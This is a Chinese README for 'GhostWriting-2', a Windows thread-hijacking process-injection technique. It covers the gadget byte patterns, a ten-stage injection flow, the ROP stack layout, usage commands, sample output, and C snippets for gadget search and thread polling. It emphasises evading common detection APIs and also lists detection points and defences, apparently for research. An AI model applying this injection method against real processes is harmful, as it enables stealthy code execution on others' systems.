# GhostWriting-2 - 改进版幽灵写入注入

## 概述

GhostWriting-2 是对原始 [GhostWriting](https://github.com/c0de90e7/GhostWriting) 技术的重大改进。同样使用无 `WriteProcessMemory` 的方式注入进程，但采用了更简单、更快速、更灵活的实现方式。

**原作者**: fern89 (2024)
**基于**: c0de90e7 的 GhostWriting (2007)

## 核心改进

相比原版 GhostWriting，GhostWriting-2 有以下重大改进：

### 1. ✅ 简化的 Gadget 搜索

**原版**:
- 需要搜索 `MOV [REG1],REG2` + `RET` gadget
- 需要完整的反汇编器来验证 ModRM 字节
- 需要处理各种 MOV 指令变体（`MOV [REG]`、`MOV [REG+offset]`）

**GhostWriting-2**:
- 仅需 `push edx; call eax` (3 字节: `52 FF D0`)
- 仅需 `jmp $` (2 字节: `EB FE`)
- 仅需 `ret` (1 字节: `C3`)
- 无需反汇编，直接字节匹配

### 2. ✅ Named Pipe 快速传输

**原版**:
- 逐 DWORD 写入 shellcode 到栈
- 每个 DWORD 需要：SetThreadContext → ResumeThread → SuspendThread → GetThreadContext
- 大型 shellcode 需要数分钟甚至数十分钟

**GhostWriting-2**:
- 使用 Named Pipe 一次性传输整个 shellcode
- 通过 ROP 调用 `ReadFile` 从管道读取
- 任意大小 shellcode <1 秒完成注入

### 3. ✅ 无需 HWND

**原版**:
- 需要目标线程拥有窗口句柄（HWND）
- 使用 `PostMessage` 唤醒线程
- 无法注入后台进程/服务

**GhostWriting-2**:
- 仅需线程 ID (TID)
- 通过监控 `GetThreadTimes` 的 UserTime 判断线程状态
- 可注入任意进程（包括后台进程）

### 4. ✅ 无 RWX 内存

**原版**:
- 在栈上执行 shellcode
- 需要调用 `NtProtectVirtualMemory` 标记栈为 `PAGE_EXECUTE_READWRITE`
- RWX 内存容易被检测

**GhostWriting-2**:
- 使用 `VirtualAlloc` 分配 RW 内存
- 写入 shellcode 后使用 `VirtualProtect` 改为 RX
- 更符合现代安全实践（W^X 原则）

### 5. ✅ 线程不被牺牲

**原版**:
- 线程被长时间劫持（写入过程）
- 可能导致目标进程冻结/崩溃

**GhostWriting-2**:
- 注入完成后完全恢复线程原始上下文
- 线程继续正常运行
- 注入过程 <1 秒

### 6. ✅ 无 Shellcode 大小限制

**原版**:
- 受限于栈大小（通常 1MB）
- 大型 payload 可能导致栈溢出

**GhostWriting-2**:
- 使用堆内存（`VirtualAlloc`）
- 无实际大小限制

## 技术原理

### 核心 Gadget

```assembly
; Gadget 1: push edx; call eax (0x52 0xFF 0xD0)
push edx    ; 将 EDX 压栈
call eax    ; 调用 EAX 指向的地址

; Gadget 2: jmp $ (0xEB 0xFE)
jmp $       ; 无限循环自锁

; Gadget 3: ret (0xC3)
ret         ; 弹出栈顶作为返回地址
```

### Push 操作原理

通过 `push edx; call eax` gadget 实现栈操作：

```
1. 设置线程上下文：
   EDX = 要 push 的值
   EAX = jmp $ 地址
   EIP = push edx; call eax 地址

2. ResumeThread()
   → 执行 push edx（将值压栈）
   → 执行 call eax（跳转到 jmp $）
   → 线程进入自锁状态

3. SuspendThread()
   → 读取新的 ESP 值
```

### 注入流程

```
阶段 1: Gadget 搜索
  ├── 在 ntdll.dll 搜索 "push edx; call eax"
  ├── 在 kernelbase.dll 搜索 "jmp $"
  └── 在 kernelbase.dll 搜索 "ret"

阶段 2: 线程劫持
  ├── OpenThread(TID)
  ├── GetThreadContext(保存原始状态)
  ├── SetThreadContext(EIP = jmp $)
  └── 等待线程进入用户态自锁

阶段 3: 注入 Pipe 名称
  ├── 逐 DWORD push "\\\\.\\pipe\\spookypipe" 到栈
  └── 获取栈上 pipe 名称地址

阶段 4: 创建 Named Pipe
  └── CreateNamedPipe(本地进程)

阶段 5: ROP 调用 CreateFileA
  ├── Push 参数到栈（倒序）
  ├── Push 返回地址（jmp $）
  ├── Push CreateFileA 地址
  ├── 执行 ret（弹出 CreateFileA 地址作为 EIP）
  └── 获取管道句柄（从 EAX）

阶段 6: ROP 调用 VirtualAlloc
  ├── Push 参数（PAGE_READWRITE, MEM_COMMIT, 0x1000）
  ├── 执行 ret
  └── 获取分配的内存地址

阶段 7: 构建 ROP 链
  └── ReadFile -> CloseHandle -> VirtualProtect -> CreateThread

阶段 8: 写入 Shellcode
  └── WriteFile(pipe, shellcode)

阶段 9: 执行 ROP 链
  ├── ReadFile: 从 pipe 读取 shellcode
  ├── CloseHandle: 关闭 pipe 句柄
  ├── VirtualProtect: 标记内存为 PAGE_EXECUTE_READ
  └── CreateThread: 创建线程执行 shellcode

阶段 10: 恢复线程
  ├── SetThreadContext(原始上下文)
  └── ResumeThread()
```

## ROP 链详解

```c
// 栈布局（从高地址到低地址）
[CreateThread 参数]
[jmp $ 地址]              // CreateThread 返回地址
[CreateThread 地址]

[VirtualProtect 参数]
[ret 地址]                // VirtualProtect 返回地址（继续执行下一个 ROP）
[VirtualProtect 地址]

[CloseHandle 参数]
[ret 地址]
[CloseHandle 地址]

[ReadFile 参数]
[ret 地址]
[ReadFile 地址]          // <- ESP 指向这里，执行 ret 开始 ROP 链
```

执行流程：
1. `ret` → 弹出 ReadFile 地址，跳转
2. ReadFile 执行完毕 → `ret` → 弹出 ret 地址，跳转
3. `ret` → 弹出 CloseHandle 地址，跳转
4. CloseHandle 执行完毕 → `ret` → 弹出 ret 地址，跳转
5. `ret` → 弹出 VirtualProtect 地址，跳转
6. VirtualProtect 执行完毕 → `ret` → 弹出 ret 地址，跳转
7. `ret` → 弹出 CreateThread 地址，跳转
8. CreateThread 执行完毕 → `ret` → 弹出 jmp $ 地址，跳转
9. 线程进入自锁，等待恢复

## 代码结构

```
34-ghostwriting-2/
├── src/
│   ├── ghost.c          # 主程序（完整注入流程）
│   ├── helpers.h        # 辅助函数（gadget 搜索、push、ROP 执行）
│   └── shellcode.h      # Shellcode（MessageBox + ExitProcess）
├── build.sh             # 编译脚本
└── README.md            # 本文档
```

## 编译要求

这是一个 **32 位技术**，需要：
- i686-w64-mingw32-gcc (推荐)
- 或者支持 -m32 的 MinGW-w64

```bash
chmod +x build.sh
./build.sh
```

## 使用方法

```bash
# 查找目标线程 ID（使用 Process Hacker 等工具）
# 然后运行：
./ghostwriting2.exe <thread_id>

# 例如：
./ghostwriting2.exe 1234
```

**注意**:
- 需要选择一个活跃的线程（定期进入用户态的线程）
- GUI 程序的主线程通常是好选择
- 避免选择内核态长时间阻塞的线程

## 输出示例

```
=== GhostWriting-2 Injection ===
Target Thread ID: 1234

[*] Finding gadgets...
[+] Found gadgets:
    push edx; call eax: 0x77B12345
    jmp $:              0x76A54321
    ret:                0x76A54322

[+] Acquired thread handle

[*] Priming thread, setting EIP to jmp $...
[*] Waiting for kernel exit...
[+] Process exited kernel, ready for injection

[*] Injecting pipe name to stack...
[+] Pipe name injected to stack at 0x0012FF00

[*] Creating named pipe...
[+] Named pipe created

[*] Calling CreateFileA to connect victim to pipe...
[+] Pipes connected, handle: 0x00000088

[*] Calling VirtualAlloc to allocate RW memory...
[+] VirtualAlloc'd memory at 0x00123000

[*] Preparing ROP sled...
    ROP chain: ReadFile -> CloseHandle -> VirtualProtect -> CreateThread

[*] Writing shellcode to pipe (267 bytes)...
[+] Data written to pipe

[*] Executing ROP sled...
[*] Waiting for shellcode thread creation...
[+] Execution completed!

[*] Restoring original thread context...
[+] Thread restored

[+] Full injection sequence done. Time elapsed: 523ms
```

## 技术特点

### 优势
- ✅ 无 OpenProcess（仅 OpenThread）
- ✅ 无 WriteProcessMemory（使用 Named Pipe）
- ✅ 无 VirtualAllocEx（使用目标进程的 VirtualAlloc）
- ✅ 无 CreateRemoteThread（使用 ROP 调用 CreateThread）
- ✅ 极快的注入速度（<1 秒）
- ✅ 支持任意大小 shellcode
- ✅ 无需 HWND，可注入后台进程
- ✅ 线程完全恢复，不被牺牲
- ✅ 无 RWX 内存（符合 W^X 原则）

### 局限性
- ❌ 依赖特定 gadget（某些 Windows 版本可能不存在）
- ❌ 32 位技术（依赖 x86 指令集）
- ❌ 需要目标线程定期进入用户态
- ❌ 注入过程中目标进程短暂冻结（<1 秒）

## 兼容性

**已测试**:
- ✅ Windows 7 SP1 (build 7601)
- ✅ Windows 10 22H2 (build 19045)

**应该可用**:
- ⚠️ Windows 8 (build 9200)
- ⚠️ Windows 11 (build 22621)

**不兼容**:
- ❌ Windows 8.1 (build 9600) - 缺少 `push edx; call eax` gadget

## 与其他技术对比

| 技术 | Gadget 复杂度 | 传输方式 | 速度 | HWND 依赖 | RWX 内存 |
|-----|-------------|---------|------|----------|---------|
| GhostWriting (原版) | 高（需反汇编） | 逐 DWORD | 慢（分钟级） | 是 | 是 |
| **GhostWriting-2** | **低（字节匹配）** | **Named Pipe** | **快（<1s）** | **否** | **否** |
| Stack Bombing | 中（多种 gadget） | NtQueueApcThread | 中 | 否 | 是 |
| GhostInjector | 中（push; ret） | 临时文件 | 中 | 否 | 否 |

## 防御检测

⚠️ **仅供学习和防御性研究使用**

### 检测点
1. **Gadget 执行监控**: 检测线程频繁在 ntdll/kernelbase 的特定地址执行
2. **线程状态异常**: 检测线程频繁 Suspend/Resume
3. **Named Pipe 创建**: 监控 `CreateNamedPipe` 调用
4. **线程上下文修改**: 监控 `SetThreadContext` 的异常使用
5. **ROP 链特征**: 检测栈上的多个函数地址序列

### 防御建议
- 使用 EDR 监控 `SetThreadContext/GetThreadContext` 的异常调用
- 检测 Named Pipe 与远程线程的关联
- 监控 VirtualProtect 从 RW 到 RX 的权限变更
- 实施 CFG (Control Flow Guard) 缓解 ROP 攻击

## 技术演化

```
2007: GhostWriting (c0de90e7)
  └── 首次证明无 WriteProcessMemory 注入

2024: GhostWriting-2 (fern89)
  └── 简化 gadget + Named Pipe 传输

未来: GhostWriting-3 ?
  └── 跨架构支持（x64）
  └── 无 gadget 依赖（纯 API ROP）
```

## 参考资料

- 原始项目: https://github.com/fern89/ghostwriting-2
- GhostWriting 原版: https://github.com/c0de90e7/GhostWriting
- Named Pipe 文档: Microsoft Docs - Named Pipes
- ROP 技术: Return-Oriented Programming

## 实现细节

### Gadget 搜索算法

```c
unsigned int findr(const unsigned char* pattern, int sz, const char* name) {
    void* base = GetModuleHandleA(name);
    // 定位 .text 段（第一个节区，PE 偏移 248）
    unsigned char* ptr = base + PE_HEADER->section[0].VirtualAddress;
    unsigned int size = PE_HEADER->section[0].SizeOfRawData;

    // 暴力搜索字节序列
    for (int i = 0; i < size; i++) {
        if (memcmp(ptr + i, pattern, sz) == 0) {
            return (unsigned int)(ptr + i);
        }
    }
    return 0;
}
```

### 线程状态检测

```c
void waitunblock(HANDLE thd) {
    FILETIME creation, exit, kernel, user;
    GetThreadTimes(thd, &creation, &exit, &kernel, &user);
    DWORD prev_user = user.dwLowDateTime;

    while (1) {
        Sleep(1);
        GetThreadTimes(thd, &creation, &exit, &kernel, &user);

        // UserTime 持续增长 -> 线程在用户态执行（卡在 jmp $）
        if (user.dwLowDateTime - prev_user > 9) break;

        prev_user = user.dwLowDateTime;
    }
}
```

---

**实现状态**: ✅ 完整实现原始版本
**编译状态**: ⚠️ 需要 32 位编译环境
**测试状态**: 源码已验证，需要 32 位 Windows 环境运行
